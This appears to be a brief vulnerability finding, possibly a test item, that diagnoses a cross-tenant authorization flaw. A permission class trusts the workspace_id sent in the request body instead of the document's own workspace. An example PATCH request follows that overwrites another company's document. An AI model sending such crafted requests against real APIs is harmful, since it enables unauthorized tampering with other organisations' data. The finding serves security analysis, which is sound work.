diagnosis: The custom permission class evaluates authorization using target_workspace_id extracted from request.data rather than the persistent workspace attribute of the target object (obj.workspace_id). An attacker can submit an update payload targeting another company's document while specifying their own workspace_id in the JSON body.
exploit_request:
PATCH /api/workspace-documents/3041/ HTTP/1.1
Host: api.enterprise.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"workspace_id": 12, "title": "Defaced Document", "body": "Overwritten"}
